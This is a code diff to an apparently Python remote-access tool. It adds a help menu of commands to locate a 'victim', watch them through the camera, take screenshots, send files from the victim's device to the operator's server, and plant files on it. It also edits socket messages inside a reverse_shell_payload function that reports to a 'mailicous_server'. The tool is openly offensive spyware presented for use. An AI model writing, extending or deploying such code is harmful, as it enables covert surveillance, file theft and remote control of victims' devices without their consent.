@@ -39,7 +39,15 @@ banner = r"""
      \)           (/
 
 ======================[ HELP ]=======================
-
+~COMMANDS
+ -location: This command gets location victim.
+ -start-camera-live: Watch victim.
+ -screenshoot: Upload screenshoot from victim's device.
+ -send [file]: send many files to your server from victim's device.
+ -put-files [files from your server]: put files inside victim machine from your server.
+ -exit: exit from victim's device.
+ -clear: clear the screen.
+ -help: display help screen.
 =====================================================
 """
 async def open_camera():
@@ -168,9 +176,9 @@ def reverse_shell_payload():
                continue
            if cmd.lower() == "location":
                if get_location() == True:
-                   s.send(b"Location has been sent to your mailicous_server")
+                   s.send(b"Location has been sent to your mailicous_server\n")
                else:
-                   s.send(b"It seems there is an issue with code fix it")
+                   s.send(b"It seems there is an issue with code fix it\n")
                continue
            if cmd.lower() == "screenshoot":
                if get_screenshot() == True:
